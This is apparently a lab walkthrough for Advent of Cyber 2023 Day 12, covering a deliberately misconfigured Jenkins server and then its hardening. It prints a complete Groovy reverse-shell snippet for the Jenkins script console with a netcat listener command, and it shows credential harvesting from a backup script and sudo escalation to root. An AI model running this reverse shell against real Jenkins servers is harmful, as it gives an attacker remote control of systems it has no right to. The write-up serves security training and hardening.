# Sleighing Threats, One Layer at a Time | Advent of Cyber 2023 | Day 12

## TL;DR of Day 12

Miconfiguration of the systems can lead to the disastrous results. You should never provide more authorization to someone than they need. Never allow users to access the resources they are not supposed to access. Always use the authentication and authorization methods rather than trusting the access.


## walkthrough

Start the machine and wait for 3-5 minutes to get it set up. Then we need to ssh as admin user using `SuperStrongPassword123` password. We will be using this session to patch the misconfigurations of the system.


### Q1: What is the default port for Jenkins?

This is general knowledge question. You can google search for this. When you get answer also visit the same from the machine IP. You should see the Jenkins interface.

### Q2: What is the password of the user tracy?

We have access to the Jenkins interface. We can always check the `script console`. You will find it inside the `Manage Jenkins`. Gotcha. It is available. It accepts the groovy script. We can levarage it to gain the reverse shell. Start netcat listner on the port 6996 using `nc -lnvp 6996` Use the following snippet to gain the reverse shell on the system:

```
String host="attacking machine IP here";
int port=6996;
String cmd="/bin/bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

Don't forgot to add your IP address. You should receive the dumb shell on your netcat listner. If you check the user using the whoami command then you should see that we have shell as the jenkins users.

> Note: We are in the same machine as the admin user. We are just going from the attacker's perspective.

Now let't check the machine around. You should see one backup script in the /opt/scripts containing the username and password for tracy. Password is our answer. We can also use them to ssh as a tracy user.

### Q3: What's the root flag?

Since we are talking about the root flag, then we will need root permission to access it. Let's check the sudo -l for tracy user. Enter the password and we will see that we can run ALL commands as root user for tracy user. Let's sudo su and gain the root user shell. We should get the the flag at the /root directory.


### Q4: What is the error message when you login as tracy again and try sudo -l after its removal from the sudoers group?

We should not allow low level users to run sudo. Let's remove the tracy from sudo group. We can use `sudo deluser tracy sudo` command from the admin panel. Now exit the tracy's ssh session and ssh again. Now if you try to run sudo -l, you will see that it is not allowed. You will be prompted with message starting with `Sorry`.


### Q5: What's the SSH flag?

We should also not allow password based access for ssh. Let's disable it in the ssh config. Edit the `/etc/ssh/sshd_config` to set the `PasswordAuthentication no`. Also comment the Include line on the top. When you configure the `PasswordAuthentication` check the line below it. You will have your flag over there.


### Q6: What is the Jenkins flag?

We should also not allow the script console from jenkins in the first place. Let's reconfigure it. Go to /var/lib/jenkins and check the config.xml.bak file which contains commented out snippet for the disbaling Anonymous read access. Uncomment it and restore the original config.xml file with config.xml.bak and that should restrict the script console access. For the flag it should be around the commented code bloack in the .bak file.


That should be all for today. See you tommorow with some more exciting learning and techniques. Keep hacking.